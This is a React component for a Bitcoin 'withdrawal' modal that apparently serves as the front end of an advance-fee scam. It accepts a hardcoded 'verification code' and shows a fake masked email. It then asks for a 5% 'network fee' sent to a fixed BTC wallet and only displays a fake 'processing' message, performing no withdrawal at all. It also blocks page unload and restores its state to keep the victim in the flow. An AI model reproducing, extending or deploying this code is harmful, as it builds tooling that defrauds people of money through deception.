import React, { useState, useEffect } from "react";
import { useWithdrawContext } from "../context/WithdrawContext";
import { useAuthContext } from "../context/authcontext";
import { Copy } from "lucide-react";

const WithdrawModals = () => {
  const { modalStep, setModalStep, withdrawCode, setWithdrawCode } =
    useWithdrawContext();
  const [recipientWallet, setRecipientWallet] = useState("");
  const { getUserData } = useAuthContext();
  const user = getUserData();
  const [transactionFee, setTransactionFee] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");
  const [copied, setCopied] = useState(false);
  const [btcWalletError, setBtcWalletError] = useState(false);
  const [recipientWalletError, setRecipientWalletError] = useState(false);
  const userBalance = user.balance;
  const staticCode = "6924";
  const btcWallet = "bc1qvca9t8gqfr4d07q90v2rfxaplfpj9xep0gedq7";

  const calculateFees = () => {
    const fee = userBalance * 0.05;
    setTransactionFee(fee.toLocaleString());
  };

  const validateRecipientWallet = (wallet) => {
    // Basic Bitcoin address validation
    if (!wallet || wallet.trim() === "") {
      return "Please enter a wallet address";
    }

    // Check if the recipient wallet matches the system fee wallet
    if (wallet.trim().toLowerCase() === btcWallet.toLowerCase()) {
      return "You cannot use the system's fee wallet address as your recipient address";
    }

    // Add more Bitcoin address validation if needed
    // This is a basic check - you might want to add more thorough validation
    if (
      !/^(1[a-km-zA-HJ-NP-Z1-9]{25,34})|(3[a-km-zA-HJ-NP-Z1-9]{25,34})|(bc1[a-z0-9]{39,59})|(bc1[a-z0-9]{11,71})$/i.test(
        wallet
      )
    ) {
      return "Please enter a valid Bitcoin wallet address";
    }

    return null; // no error
  };

  // Save withdrawal progress on every step change
  useEffect(() => {
    if (modalStep > 0) {
      const withdrawalData = {
        started: localStorage.getItem("ongoingWithdrawal")
          ? JSON.parse(localStorage.getItem("ongoingWithdrawal")).started
          : new Date().toISOString(),
        currentStep: modalStep,
        recipientWallet,
        withdrawCode,
        transactionFee,
      };
      localStorage.setItem("ongoingWithdrawal", JSON.stringify(withdrawalData));
    }
  }, [modalStep, recipientWallet, withdrawCode, transactionFee]);

  // Restore withdrawal progress on component mount
  useEffect(() => {
    const savedWithdrawal = localStorage.getItem("ongoingWithdrawal");
    if (savedWithdrawal) {
      const data = JSON.parse(savedWithdrawal);
      setModalStep(data.currentStep);
      if (data.recipientWallet) setRecipientWallet(data.recipientWallet);
      if (data.withdrawCode) setWithdrawCode(data.withdrawCode);
      if (data.transactionFee) setTransactionFee(data.transactionFee);
    }
  }, []);

  // Prevent modal from closing on ESC key or clicking outside
  useEffect(() => {
    const preventClose = (e) => {
      if (modalStep > 0) {
        e.preventDefault();
        e.stopPropagation();
        return false;
      }
    };

    window.addEventListener("beforeunload", preventClose);
    return () => window.removeEventListener("beforeunload", preventClose);
  }, [modalStep]);

  // Modified completion logic
  useEffect(() => {
    if (modalStep === 4) {
      const timer = setTimeout(() => {
        // Clear the ongoing withdrawal data
        localStorage.removeItem("ongoingWithdrawal");
        // Keep the processing state
        localStorage.setItem("withdrawalProcessing", "true");
        setModalStep(0);
      }, 10000);
      return () => clearTimeout(timer);
    }
  }, [modalStep]);

  // Replace the early return with a check for saved state
  if (modalStep === 0 && !localStorage.getItem("ongoingWithdrawal"))
    return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 px-5">
      <div className="bg-white rounded-lg p-10 w-full md:w-[70%] lg:w-[50%] mx-auto text-black">
        {modalStep === 1 && (
          <>
            <h2 className="text-3xl text-center lg:text-start font-semibold mb-4">
              Verify Your Email
            </h2>
            <p className="mb-4 text-base lg:text-lg text-center lg:text-start">
              For your security, we've sent a verification code to{" "}
              <strong className="text-[#3038E5]">em****eb***@g***l.com</strong>.
              <br />
              Please enter the code below. The code is valid for{" "}
              <i>
                <strong>24 hours</strong>
              </i>
              .
            </p>
            <input
              type="text"
              placeholder="Enter code"
              value={withdrawCode}
              onChange={(e) => {
                setWithdrawCode(e.target.value);
                setErrorMessage("");
              }}
              className={`text-lg tracking-widest border rounded-lg px-6 py-4 sm:px-8 sm:py-3 w-full mb-1 focus:outline outline-[#3038E5] ${
                errorMessage ? "border-red-500" : ""
              }`}
            />
            {errorMessage && (
              <p className="text-red-500 text-sm mb-4">{errorMessage}</p>
            )}
            <button
              onClick={() => {
                if (withdrawCode === staticCode) {
                  calculateFees();
                  setModalStep(2);
                } else {
                  setErrorMessage(
                    "Invalid verification code. Please check and try again."
                  );
                }
              }}
              className="mt-4 px-6 py-4 sm:px-8 sm:py-3 font-extraLight bg-[#3038E5] rounded-2xl w-full lg:w-max h-[52px] cursor-pointer hover:shadow-md duration-300 text-white text-lg"
            >
              Verify Access
            </button>
          </>
        )}

        {modalStep === 2 && (
          <>
            <h2 className="text-3xl text-center lg:text-start font-semibold mb-4">
              Transaction Fee
            </h2>
            <p className="mb-4 text-base lg:text-lg text-center lg:text-start">
              To process your withdrawal, a network fee of{" "}
              <strong className="text-base lg:text-xl">
                ${transactionFee}
              </strong>{" "}
              (5% of transaction amount) is required. Please send this amount to
              the following Bitcoin address:
            </p>
            <p
              className={`font-mono bg-gray-200 py-3 px-3 lg:px-6 text-center text-[10px] md:text-sm truncate lg:text-lg font-bold rounded-lg mb-4 flex items-center justify-between ${
                btcWalletError ? "border-red-500 border" : ""
              }`}
            >
              {copied ? "Address copied to clipboard!" : btcWallet}
              <button
                onClick={() => {
                  navigator.clipboard.writeText(btcWallet);
                  setCopied(true);
                  setBtcWalletError(false);
                  setTimeout(() => setCopied(false), 3000);
                }}
                className="ml-4 text-blue-600 hover:text-blue-800"
              >
                <Copy size={16} />
              </button>
            </p>
            {btcWalletError && (
              <p className="text-red-500 text-sm mb-4">
                Please copy the wallet address and make payment before
                proceeding.
              </p>
            )}
            <button
              onClick={() => {
                if (!copied) {
                  setBtcWalletError(true);
                } else {
                  setModalStep(3);
                }
              }}
              className="mt-4 px-6 py-4 sm:px-8 sm:py-3 font-extraLight bg-[#3038E5] rounded-2xl w-full lg:w-[158px] h-[52px] cursor-pointer hover:shadow-md duration-300 text-white text-lg"
            >
              Next
            </button>
          </>
        )}

        {modalStep === 3 && (
          <>
            <h2 className="text-3xl text-center lg:text-start font-semibold mb-4">
              Recipient Wallet
            </h2>
            <p className="mb-4 text-base lg:text-lg text-center lg:text-start">
              Enter the Bitcoin wallet address where you would like to receive
              your funds.
            </p>
            <input
              type="text"
              placeholder="Wallet address"
              value={recipientWallet}
              onChange={(e) => {
                setRecipientWallet(e.target.value);
                setRecipientWalletError(false);
              }}
              className={`border rounded-lg px-6 py-4 sm:px-8 sm:py-3 w-full mb-4 focus:outline ${
                recipientWalletError ? "border-red-500" : "outline-[#3038E5]"
              }`}
            />
            {recipientWalletError && (
              <p className="text-red-500 text-sm mb-4">
                {typeof recipientWalletError === "string"
                  ? recipientWalletError
                  : "Please enter a valid wallet address."}
              </p>
            )}
            <button
              onClick={() => {
                const validationError =
                  validateRecipientWallet(recipientWallet);
                if (validationError) {
                  setRecipientWalletError(validationError);
                } else {
                  setModalStep(4);
                }
              }}
              className="mt-4 px-6 py-4 sm:px-8 sm:py-3 font-extraLight bg-[#3038E5] rounded-2xl w-full lg:w-max h-[52px] cursor-pointer hover:shadow-md duration-300 text-white text-lg"
            >
              Withdraw BTC
            </button>
          </>
        )}

        {modalStep === 4 && (
          <>
            <h2 className="text-3xl text-center lg:text-start font-semibold mb-4">
              Transaction In Progress
            </h2>
            <p className="mb-4 text-base lg:text-lg text-center lg:text-start">
              Your withdrawal request is being processed. This typically takes
              2-4 hours to complete. You will receive a confirmation email once
              the transaction is finalized.
            </p>
          </>
        )}

        <div className="absolute top-36 left-1/2 transform -translate-x-1/2 w-[90%] text-white text-lg text-center pb-10">
          Please complete the withdrawal process before closing
        </div>
      </div>
    </div>
  );
};

export default WithdrawModals;
